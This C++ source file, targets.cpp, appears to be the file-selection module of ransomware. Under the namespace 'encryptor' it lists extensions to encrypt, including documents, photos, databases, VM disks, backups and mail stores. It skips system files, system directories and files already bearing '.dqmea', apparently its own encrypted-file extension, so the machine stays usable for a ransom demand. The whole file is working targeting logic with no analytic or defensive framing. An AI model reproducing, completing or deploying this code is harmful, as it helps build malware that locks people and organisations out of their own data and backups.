// targets.cpp — File extension whitelist / blacklist
#include "targets.h"
#include "util/filesystem.h"
#include <fstream>
#include <sstream>

namespace encryptor {

// Encrypt these (comprehensive list).
static const wchar_t* ENCRYPT_EXTS[] = {
    // documents
    L".doc", L".docx", L".xls", L".xlsx", L".ppt", L".pptx",
    L".pdf", L".txt", L".rtf", L".odt", L".ods", L".odp",
    L".csv", L".md", L".tex",
    // images
    L".jpg", L".jpeg", L".png", L".gif", L".bmp", L".tiff",
    L".psd", L".ai", L".svg", L".raw", L".heic",
    // videos
    L".mp4", L".mkv", L".avi", L".mov", L".wmv", L".flv", L".webm",
    // audio
    L".mp3", L".wav", L".flac", L".aac", L".ogg", L".m4a",
    // archives
    L".zip", L".rar", L".7z", L".tar", L".gz", L".bz2", L".xz",
    // code
    L".c", L".cpp", L".h", L".hpp", L".cs", L".java", L".py",
    L".js", L".ts", L".go", L".rs", L".rb", L".php", L".sql",
    // configs
    L".conf", L".ini", L".json", L".xml", L".yaml", L".yml", L".toml",
    // databases
    L".db", L".sqlite", L".sqlite3", L".mdb", L".accdb",
    // CAD / design
    L".dwg", L".dxf", L".stl", L".obj", L".blend",
    // virtual machine
    L".vmdk", L".vdi", L".vhd", L".vhdx", L".qcow2",
    // backups
    L".bak", L".backup", L".dump",
    // misc
    L".log", L".eml", L".msg", L".pst", L".ost",
    nullptr
};

// Never encrypt these (system-critical).
static const wchar_t* SKIP_EXTS[] = {
    L".exe", L".dll", L".sys", L".drv", L".ocx", L".cpl",
    L".msi", L".msp", L".msu", L".cab",
    L".lnk", L".url",
    L".tmp", L".temp", L".swp", L".lock",
    L".dqmea", L".dqmea_partial",
    nullptr
};

// Paths to skip (system dirs).
static const wchar_t* SKIP_PATHS[] = {
    L"\\windows\\system32\\config\\",
    L"\\windows\\system32\\catroot",
    L"\\windows\\system32\\drivers\\",
    L"\\windows\\winsxs\\",
    L"\\windows\\servicing\\",
    L"\\$recycle.bin\\",
    L"\\system volume information\\",
    L"\\boot\\",
    L"\\recovery\\",
    nullptr
};

static std::unordered_set<std::wstring> g_user_exts;
static std::unordered_set<std::wstring> g_user_skip;
static bool g_loaded = false;

static bool load_ext_list(const std::wstring& path,
                          std::unordered_set<std::wstring>& out) {
    std::ifstream f(path);
    if (!f) return false;
    std::string line;
    while (std::getline(f, line)) {
        if (line.empty() || line[0] == '#') continue;
        if (line[0] != '.') line = "." + line;
        std::wstring w(line.begin(), line.end());
        out.insert(w);
    }
    return true;
}

bool load_targets(const std::wstring& path) {
    return load_ext_list(path, g_user_exts);
}

bool load_skip(const std::wstring& path) {
    return load_ext_list(path, g_user_skip);
}

bool should_encrypt(const std::wstring& path, const std::wstring& ext) {
    // lowercase ext
    std::wstring e = ext;
    for (auto& c : e) c = towlower(c);

    // user skip list overrides
    if (!g_user_skip.empty() && g_user_skip.count(e)) return false;

    // path skip
    std::wstring lower_path = path;
    for (auto& c : lower_path) c = towlower(c);
    for (const wchar_t** p = SKIP_PATHS; *p; p++) {
        if (lower_path.find(*p) != std::wstring::npos) return false;
    }

    // user encrypt list overrides
    if (!g_user_exts.empty()) return g_user_exts.count(e) > 0;

    // built-in skip
    for (const wchar_t** p = SKIP_EXTS; *p; p++) {
        if (e == *p) return false;
    }

    // built-in encrypt
    for (const wchar_t** p = ENCRYPT_EXTS; *p; p++) {
        if (e == *p) return true;
    }
    return false;
}

} // namespace encryptor
